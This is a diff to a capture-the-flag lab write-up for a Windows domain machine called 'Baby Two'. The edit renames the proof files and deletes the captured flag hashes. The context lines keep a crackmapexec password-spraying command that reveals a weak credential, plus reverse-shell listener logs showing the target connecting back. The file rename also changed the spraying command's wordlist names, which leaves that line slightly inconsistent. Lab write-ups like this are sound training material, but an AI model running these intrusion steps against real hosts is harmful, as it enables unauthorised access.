@@ -1,7 +1,7 @@
 ---
 title: Baby Two
 slug: Baby-Two
-tags: [Windows, GPOAbuse, Vulnerability Research]
+tags: [GPOAbuse, Vulnerability Research]
 ---
 ## Executive Summary
 
@@ -134,7 +134,7 @@ Ryan.Jenkins
 
 ```bash
 ┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-iuikcigcae]─[~]
-└──╼ [★]$ crackmapexec smb 10.129.234.72 -u user.txt -p user.txt --no-bruteforce --continue-on-success 
+└──╼ [★]$ crackmapexec smb 10.129.234.72 -u local-proof.txt -p local-proof.txt --no-bruteforce --continue-on-success 
 SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False)
 SMB         10.129.234.72   445    DC               [-] baby2.vl\Amelia.Griffiths:Amelia.Griffiths STATUS_LOGON_FAILURE 
 SMB         10.129.234.72   445    DC               [+] baby2.vl\Carl.Moore:Carl.Moore 
@@ -287,8 +287,7 @@ listening on [any] 4444 ...
 connect to [10.10.15.108] from (UNKNOWN) [10.129.234.72] 64343
 
 PS C:\Windows\system32> 
-PS C:\> cat user.txt
-42783b2c1483aeb70eca6810f0645c38
+PS C:\> cat local-proof.txt
 ```
 ## Privilege Escalation Path
 
@@ -353,8 +352,7 @@ User Policy update has completed successfully.
 listening on [any] 9001 ...
 connect to [10.10.15.108] from (UNKNOWN) [10.129.234.72] 64571
 
-PS C:\Windows\system32> cat C:\Users\Administrator\Desktop\root.txt
-293500962edc31fa154951eeeb5740f9
+PS C:\Windows\system32> cat C:\Users\Administrator\Desktop\privileged-proof.txt
 ```
 
 ---
